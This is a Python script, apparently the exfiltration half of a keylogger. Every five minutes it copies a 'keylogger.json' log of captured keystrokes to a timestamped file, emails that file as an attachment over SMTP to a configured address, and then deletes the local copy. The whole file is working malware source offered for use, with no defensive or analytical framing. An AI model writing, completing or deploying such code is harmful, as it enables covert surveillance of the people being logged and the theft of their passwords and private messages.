import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import json
import time
import os
import threading

# Email configuration
SMTP_SERVER = 'smtp.your_smtp_code.com'
SMTP_PORT = 587
USERNAME = 'name@example.com'
PASSWORD = 'Password'
TO_EMAIL = 'name@example.com'

log_file = "keylogger.json"


def create_json_file():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{timestamp}.json"
    if os.path.exists(log_file):
        with open(log_file, 'r') as file:
            data = json.load(file)
        with open(filename, 'w') as file:
            json.dump(data, file, indent=4)
    else:
        with open(filename, 'w') as file:
            json.dump({}, file, indent=4)
    return filename


def send_email(filename):
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f"Keylogger Data - {filename}"
        msg['From'] = USERNAME
        msg['To'] = TO_EMAIL

        with open(filename, 'rb') as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(part)

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(USERNAME, PASSWORD)
            server.sendmail(USERNAME, TO_EMAIL, msg.as_string())
            print(f"Email with {filename} sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")


def job():
    filename = create_json_file()
    send_email(filename)
    os.remove(filename)


def run_scheduler(interval, func):
    while True:
        func()
        time.sleep(interval)


# Run the scheduler in a separate thread, executing `job` every 5 minutes (300 seconds)
scheduler_thread = threading.Thread(target=run_scheduler, args=(300, job))
scheduler_thread.daemon = True
scheduler_thread.start()

# Keep the script running
while True:
    time.sleep(1)
